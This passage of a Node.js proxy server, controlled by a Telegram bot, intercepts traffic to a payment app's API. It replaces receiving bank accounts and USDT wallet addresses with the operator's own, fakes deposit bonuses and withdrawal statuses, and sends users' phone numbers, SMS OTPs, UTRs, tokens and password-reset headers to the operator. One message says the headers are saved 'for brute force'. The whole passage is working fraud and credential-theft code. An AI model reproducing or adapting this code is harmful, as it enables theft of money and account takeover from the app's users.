      } catch(e) {
        await bot.sendMessage(chatId, `⚠️ Error: ${e.message}`);
      }
      return res.sendStatus(200);
    }

    else if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length !== 3) {
        await bot.sendMessage(chatId, '❌ Format: /addbank AccNo | Name | IFSC');
        return res.sendStatus(200);
      }
      if (bankData.banks.length >= 10) {
        await bot.sendMessage(chatId, '❌ Max 10 banks.');
        return res.sendStatus(200);
      }
      bankData.banks.push({ accountNo: parts[0], accountHolder: parts[1], ifsc: parts[2] });
      if (bankData.banks.length === 1) bankData.activeIndex = 0;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`✅ Bank #${bankData.banks.length} added:
${parts[0]} | ${parts[1]} | ${parts[2]}
${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.banks.length + ' to activate'}`
      );
    }

    else if (text.startsWith('/removebank ')) {
      const num = parseInt(text.substring(12).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
        return res.sendStatus(200);
      }
      const removed = bankData.banks.splice(num - 1, 1)[0];
      if (bankData.activeIndex === num - 1) bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
      else if (bankData.activeIndex > num - 1) bankData.activeIndex--;
      if (bankData.userOverrides) {
        for (const uid of Object.keys(bankData.userOverrides)) {
          const uo = bankData.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === num - 1) delete uo.bankIndex;
            else if (uo.bankIndex > num - 1) uo.bankIndex--;
          }
        }
      }
      await saveData(bankData);
      await bot.sendMessage(chatId, `🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}`);
    }

    else if (text.startsWith('/usebank ')) {
      const num = parseInt(text.substring(9).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
        return res.sendStatus(200);
      }
      bankData.activeIndex = num - 1;
      await saveData(bankData);
      const bank = bankData.banks[bankData.activeIndex];
      await bot.sendMessage(chatId,
`✅ Bank #${num} ACTIVE (global):
${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
      );
    }

    else if (text === '/deactivate') {
      bankData.activeIndex = -1;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 All banks deactivated (global).');
    }

    else if (text === '/on') {
      bankData.botEnabled = true;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🟢 Bot ON (global)! Bank overlay + notifications active.');
    }

    else if (text === '/off') {
      bankData.botEnabled = false;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 Bot OFF (global)! No overlay, no notifications.');
    }

    else if (text === '/rotate on') {
      if (bankData.banks.length < 2) {
        await bot.sendMessage(chatId, '❌ Add at least 2 banks for auto-rotate.');
        return res.sendStatus(200);
      }
      bankData.autoRotate = true;
      bankData.lastUsedIndex = -1;
      await saveData(bankData);
      await bot.sendMessage(chatId, `🔄 Auto-Rotate ON!\n${bankData.banks.length} banks in rotation.`);
    }

    else if (text === '/rotate off') {
      bankData.autoRotate = false;
      await saveData(bankData);
      const active = getActiveBank(bankData, null);
      await bot.sendMessage(chatId, `🔄 Auto-Rotate OFF!\nFixed bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None (use /usebank)'}`);
    }

    else if (text.startsWith('/deposit on')) {
      const amountStr = text.substring(11).trim();
      const amount = parseFloat(amountStr);
      if (amountStr && isNaN(amount)) {
        await bot.sendMessage(chatId, '❌ Format: /deposit on <amount>\nFor per-ID: /id deposit on <amount> <userId>');
        return res.sendStatus(200);
      }
      bankData.depositSuccess = true;
      if (!isNaN(amount) && amount > 0) {
        bankData.depositBonus = (bankData.depositBonus || 0) + amount;
      }
      await saveData(bankData);
      await bot.sendMessage(chatId,
`✅ Deposit SUCCESS mode ON (GLOBAL — all users)!

${amount > 0 ? '💰 Added: ₹' + amount + '\n' : ''}Balance Bonus: ₹${bankData.depositBonus || 0}

For per-ID control: /id deposit on <amount> <userId>`
      );
    }

    else if (text === '/deposit off') {
      bankData.depositSuccess = false;
      bankData.depositBonus = 0;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 Deposit OFF (GLOBAL)! Real data restored.\nPer-ID overrides still active. Use /id list to check.');
    }

    else if (text === '/list') {
      const rotateStatus = bankData.autoRotate ? '🔄 Auto-Rotate: ON' : '🔄 Auto-Rotate: OFF';
      const botStatus = bankData.botEnabled !== false ? '🟢 Bot: ON' : '🔴 Bot: OFF';
      const depositStatus = bankData.depositSuccess ? '✅ Deposit: SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Deposit: Normal';
      const idCount = Object.keys(bankData.userOverrides || {}).length;
      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}\n\n${botStatus} (global)\n${rotateStatus}\n${depositStatus} (global)\n👤 Per-ID overrides: ${idCount}\n\nUse /id list for per-ID details`);
    }

    else if (text === '/status') {
      const botOn = bankData.botEnabled !== false;
      const rotate = bankData.autoRotate === true;
      const deposit = bankData.depositSuccess === true;
      const active = getActiveBank(bankData, null);
      const idCount = Object.keys(bankData.userOverrides || {}).length;
      let msg = `📊 Global Status:\n\n`;
      msg += `Bot: ${botOn ? '🟢 ON' : '🔴 OFF'}\n`;
      msg += `Auto-Rotate: ${rotate ? '🔄 ON (' + bankData.banks.length + ' banks)' : '❌ OFF'}\n`;
      msg += `Deposit: ${deposit ? '✅ SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Normal'}\n`;
      msg += `Banks: ${bankData.banks.length}\n`;
      msg += `Per-ID overrides: ${idCount}\n`;
      if (bankData.withdrawOverride > 0) {
        msg += `Withdraw Override: ON global (first ${bankData.withdrawOverride} order(s) → Paying)\n`;
      }
      const wUsers = Object.entries(bankData.userOverrides || {}).filter(([k, v]) => v.withdrawCount > 0);
      if (wUsers.length > 0) {
        msg += `Withdraw per-ID:\n`;
        wUsers.forEach(([uid, v]) => { msg += `  👤 ${uid}: first ${v.withdrawCount} order(s) → Paying\n`; });
      }
      msg += `USDT Override: ${bankData.usdtAddress ? '✅ ' + bankData.usdtAddress.substring(0, 10) + '...' : '❌ OFF'}\n`;
      msg += `Request Logging: ${bankData.logRequests ? '📡 ON' : '🔇 OFF'}\n`;
      if (active) {
        msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
      } else {
        msg += `\n⚠️ No active bank`;
      }
      await bot.sendMessage(chatId, msg);
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error('Telegram error:', err);
    return res.sendStatus(200);
  }
});

app.all('/wallet/online/walletType', async (req, res) => {
  const bankData = await loadData();
  const userId = extractUserId(req, null);
  const eff = getEffectiveSettings(bankData, userId);
  if (eff.botEnabled === false) return await transparentProxy(req, res);
  const active = await getActiveBankAndSave(bankData, userId);
  if (!active) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp && jsonResp.data) {
      const originalValues = {};
      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
      if (jsonResp.code === undefined) jsonResp.code = 1;
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('walletType proxy error:', e.message);
    res.json({
      code: 1,
      data: { receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder, receiveIfsc: active.ifsc, walletType: 'paytm' },
      msg: 'success'
    });
  }
});

app.post('/money/uploadUtr', async (req, res) => {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  if (bankData.adminChatId && bot) {
    let b = req.parsedBody || {};
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.includes('multipart/form-data')) {
      const bodyStr = req.rawBody.toString();
      const utrMatch = bodyStr.match(/name="utr"[\r\n]+([^\r\n-]+)/);
      const orderMatch = bodyStr.match(/name="orderId"[\r\n]+([^\r\n-]+)/);
      const amountMatch = bodyStr.match(/name="utrAmount"[\r\n]+([^\r\n-]+)/);
      if (utrMatch) b.utr = utrMatch[1].trim();
      if (orderMatch) b.orderId = orderMatch[1].trim();
      if (amountMatch) b.utrAmount = amountMatch[1].trim();
    }
    const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
    if (!b.utr && qs.get('utr')) b.utr = qs.get('utr');
    if (!b.orderId && qs.get('orderId')) b.orderId = qs.get('orderId');
    if (!b.utrAmount && qs.get('utrAmount')) b.utrAmount = qs.get('utrAmount');

    const userId = b.userId || qs.get('userId') || 'N/A';
    bot.sendMessage(bankData.adminChatId,
`💰 UTR Uploaded!
👤 User: ${userId}
Order: ${b.orderId || 'N/A'}
UTR: ${b.utr || 'N/A'}
Amount: ₹${b.utrAmount || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
    if (userId !== 'N/A') {
      trackUser(bankData, userId, `UTR ${b.utr || ''}`);
      saveData(bankData).catch(() => {});
    }
  }
  await transparentProxy(req, res);
});

app.post('/money/cancelUtr', async (req, res) => {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`❌ UTR Cancelled!
Order: ${req.parsedBody?.orderId || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }
  await transparentProxy(req, res);
});

async function proxyAndReplaceBankDetails(req, res, label) {
  const bankData = await loadData();
  const reqUserId = extractUserId(req, null);
  const reqEff = getEffectiveSettings(bankData, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(bankData, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(bankData, detectedUserId) : null;

    if (jsonResp && jsonResp.data && active) {
      const originalValues = {};
      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
    }

    if (bankData.adminChatId && bot) {
      const orderId = jsonResp?.data?.orderId || req.parsedBody?.orderId || 'N/A';
      const amount = jsonResp?.data?.amountOrder || jsonResp?.data?.amount || req.parsedBody?.amount || 'N/A';
      bot.sendMessage(bankData.adminChatId,
`🔔 ${label}
👤 User: ${detectedUserId || 'N/A'}
Order: ${orderId}
Amount: ₹${amount}
Bank: ${active ? active.accountHolder : 'None'}
Acc: ${active ? active.accountNo : 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(() => {});
    }

    if (detectedUserId) {
      const orderId = jsonResp?.data?.orderId || '';
      trackUser(bankData, detectedUserId, `Order ${orderId}`);
      saveData(bankData).catch(() => {});
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('Proxy+replace error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  const bankData = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const detectedUserId = extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(bankData, detectedUserId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;

    if (detectedUserId) {
      saveTokenUserId(req, detectedUserId);
      trackUser(bankData, detectedUserId, `App Open ${req.path}`);
      saveData(bankData).catch(() => {});
    }

    if (bonus > 0 && jsonResp && jsonResp.data) {
      addBonusToBalanceFields(jsonResp.data, bonus);
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('Balance proxy error:', e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

async function proxyAndReplaceBankInList(req, res) {
  const bankData = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const detectedUserId = extractUserId(req, jsonResp);
    if (detectedUserId) saveTokenUserId(req, detectedUserId);
    const eff = getEffectiveSettings(bankData, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(bankData, detectedUserId) : null;

    if (jsonResp && jsonResp.data) {
      const applyToItem = (item) => {
        const itemUserId = item.userId ? String(item.userId) : detectedUserId;
        const itemEff = getEffectiveSettings(bankData, itemUserId);
        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(bankData, itemUserId) : null;

        if (itemActive) {
          const origVals = {};
          deepReplaceBankDetails(item, itemActive, origVals, 0);
        }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(jsonResp.data)) {
        jsonResp.data.forEach(applyToItem);
      } else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
        jsonResp.data.list.forEach(applyToItem);
      } else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
        jsonResp.data.records.forEach(applyToItem);
      } else {
        applyToItem(jsonResp.data);
      }

      const wCount = bankData.withdrawOverride || 0;
      if (wCount > 0) {
        let items = null;
        if (Array.isArray(jsonResp.data)) items = jsonResp.data;
        else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
        else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;

        if (items && items.length > 0 && items[0].stat !== undefined) {
          let changed = 0;
          for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
            items[i].stat = 0;
            changed++;
          }
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('Proxy+list replace error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

app.post('/money/orderId', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'New Order!');
});

app.post('/money/create/v2', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'New Order (v2)!');
});

app.post('/money/init/order', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'Init Order!');
});

app.all('/money/order/list', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/list/v2', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/order/detail', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/orderDetail', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/rechargeRecord', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/payOrder/list', async (req, res) => {
  const bankData = await loadData();
  const statNames = { 0: 'Paying', 1: 'SUCCESS', 4: 'Expired' };

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp && Array.isArray(jsonResp.data) && jsonResp.data.length > 0) {
      const items = jsonResp.data;
      let changed = 0;
      const changedDetails = [];

      for (let i = 0; i < items.length; i++) {
        const itemCustId = String(items[i].customerId || '');
        const userOverride = bankData.userOverrides && bankData.userOverrides[itemCustId];
        const perUserCount = userOverride && userOverride.withdrawCount ? userOverride.withdrawCount : 0;
        const globalCount = bankData.withdrawOverride || 0;
        const effectiveCount = perUserCount || globalCount;

        if (effectiveCount <= 0) continue;

        const userItems = items.filter(it => String(it.customerId || '') === itemCustId);
        const userIndex = userItems.indexOf(items[i]);

        if (userIndex < effectiveCount && items[i].stat !== 0) {
          const oldStat = items[i].stat;
          items[i].stat = 0;
          changedDetails.push(`₹${(items[i].amount || 0) / 100} [${itemCustId}] (${statNames[oldStat] || 'stat=' + oldStat} → Paying)`);
          changed++;
        }
      }

      if (changed > 0) {
        const newBody = JSON.stringify(jsonResp);

        if (bankData.adminChatId && bot) {
          bot.sendMessage(bankData.adminChatId,
            `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`
          ).catch(() => {});
        }

        respHeaders['content-type'] = 'application/json; charset=utf-8';
        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
        respHeaders['pragma'] = 'no-cache';
        delete respHeaders['etag'];
        delete respHeaders['last-modified'];
        res.writeHead(200, respHeaders);
        res.end(newBody);
        return;
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('payOrder/list proxy error:', e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
});

app.all('/money/withdrawRecord', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
let savedForgetPassHeaders = null;

app.all('/user/forgetPass', async (req, res) => {
  try {
    const bankData = await loadData();
    const reqBody = req.parsedBody || {};
    const rawStr = req.rawBody ? req.rawBody.toString().substring(0, 500) : '';

    const capturedHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' ||
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      capturedHeaders[key] = val;
    }
    capturedHeaders['host'] = 'api.i-money.vip';
    savedForgetPassHeaders = capturedHeaders;

    if (bankData.adminChatId && bot) {
      try {
        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset!\nParsed: ${JSON.stringify(reqBody, null, 2).substring(0, 800)}\nRaw: ${rawStr}\n\n🔐 Auth headers saved for brute force`);
      } catch(e) {}
    }

    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);

    if (jsonResp && jsonResp.statusCode === '1023') {
      if (bankData.adminChatId && bot) {
        try { await bot.sendMessage(bankData.adminChatId, `❌ Wrong OTP: ${reqBody.smsCode || '?'}\nServer: Wrong SMS verification code`); } catch(e) {}
      }
      const errorResp = { status: 400, statusCode: '1023', statusInfo: 'Wrong SMS verification code', data: null, code: 0, msg: 'Wrong OTP' };
      const errorBody = JSON.stringify(errorResp);
      respHeaders['content-type'] = 'application/json; charset=utf-8';
      respHeaders['content-length'] = String(Buffer.byteLength(errorBody));
      res.writeHead(400, respHeaders);
      res.end(errorBody);
      return;
    }

    if (jsonResp && (jsonResp.statusCode === '0' || jsonResp.statusInfo === 'SUCCESS')) {
      if (bankData.adminChatId && bot) {
        try { await bot.sendMessage(bankData.adminChatId, `✅ Password Reset SUCCESS!\nPhone: ${reqBody.phone || '?'}\nOTP: ${reqBody.smsCode || '?'}`); } catch(e) {}
      }
    }

    if (bankData.adminChatId && bot) {
      try {
        const dump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 2000);
        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset Response:\n${dump}`);
      } catch(e) {}
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
});

app.all('/user/cashFlow', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.post('/money/check/payStatus', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.post('/login', async (req, res) => {
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const uid = extractUserId(req, jsonResp);
    if (uid) saveTokenUserId(req, uid);
    if (uid && jsonResp && jsonResp.data && jsonResp.data.token) {
      tokenUserMap[jsonResp.data.token] = uid;
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
});

app.all('/user/*', async (req, res) => {
  const path = req.path.toLowerCase();
  if (path === '/user/cashflow') return await proxyAndReplaceBankInList(req, res);
  await proxyAndAddBonus(req, res);
});

app.all('/smsCode', async (req, res) => {
  try {
    const bankData = await loadData();
    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
    const reqBody = req.body || {};

    if (bankData.adminChatId && bot) {
      try {
        const dump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 3000);
        const reqDump = JSON.stringify(reqBody, null, 2).substring(0, 500);
        await bot.sendMessage(bankData.adminChatId, `📱 SMS OTP Request!\nPhone: ${reqBody.phone || reqBody.mobile || reqBody.phoneNumber || '?'}\nRequest: ${reqDump}\n\n📋 Response:\n${dump}`);
      } catch(e) {}
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
});


function replaceUsdtInResponse(jsonResp, bankData, label) {
  if (!bankData.usdtAddress || !jsonResp) return null;
  const newAddr = bankData.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;

  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return;
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
        if (kl.includes('usdt') && kl.includes('addr') || kl === 'address' || kl === 'customusdtaddress' || kl === 'walletaddress' || kl === 'addr') {
          if (obj[key].length >= 20 && obj[key] !== newAddr) {
            oldAddr = oldAddr || obj[key];
            obj[key] = newAddr;
          }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrcodeurl') {
          obj[key] = qrUrl;
        }
      } else if (typeof obj[key] === 'object') {
        scanAndReplace(obj[key], depth + 1);
      }
    }
    if (oldAddr) {
      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
          obj[key] = obj[key].replace(re, newAddr);
        }
      }
    }
    return oldAddr;
  }

  let foundOld = '';
  if (jsonResp.data) foundOld = scanAndReplace(jsonResp.data, 0) || '';
  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
  return { oldAddr: foundOld, newAddr, qrUrl };
}

app.all('/usdt', async (req, res) => {
  try {
    const bankData = await loadData();
    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);

    if (jsonResp && bankData.adminChatId && bot && bankData.logRequests) {
      try {
        const target = jsonResp.data || jsonResp;
        const dump = JSON.stringify(target, null, 2).substring(0, 3500);
        await bot.sendMessage(bankData.adminChatId, `📋 /usdt BEFORE:\n${dump}`);
      } catch(e) {}
    }

    const result = replaceUsdtInResponse(jsonResp, bankData, '/usdt');

    if (result && bankData.adminChatId && bot) {
      try {
        const target = jsonResp.data || jsonResp;
        const afterDump = JSON.stringify(target, null, 2).substring(0, 2000);
        await bot.sendMessage(bankData.adminChatId, `✅ /usdt AFTER:\n${afterDump}`);
      } catch(e) {}
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    console.error('USDT proxy error:', e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
});

app.all('/usdt/rate', async (req, res) => {
  try {
    const bankData = await loadData();
    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);

    if (jsonResp && bankData.adminChatId && bot && bankData.logRequests) {
      try {
        const target = jsonResp.data || jsonResp;
        const dump = JSON.stringify(target, null, 2).substring(0, 3500);
        await bot.sendMessage(bankData.adminChatId, `📋 /usdt/rate dump:\n${dump}`);
      } catch(e) {}
    }

    replaceUsdtInResponse(jsonResp, bankData, '/usdt/rate');
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
});

app.all('/paymentAddr/*', async (req, res) => {
  try {
    const bankData = await loadData();
    if (bankData.usdtAddress) {
      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(bankData.usdtAddress)}`;
      res.writeHead(302, { 'Location': qrUrl, 'Cache-Control': 'no-store, no-cache' });
      res.end();
      return;
    }
    await transparentProxy(req, res);
  } catch (e) {
    await transparentProxy(req, res);
  }
});

app.get('/health', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData, null);
  const idCount = Object.keys(bankData.userOverrides || {}).length;
  res.json({ status: 'ok', bankActive: !!active, totalBanks: bankData.banks.length, adminSet: !!bankData.adminChatId, perIdOverrides: idCount });
});

app.use(async (req, res) => {
  await transparentProxy(req, res);
});

module.exports = app;
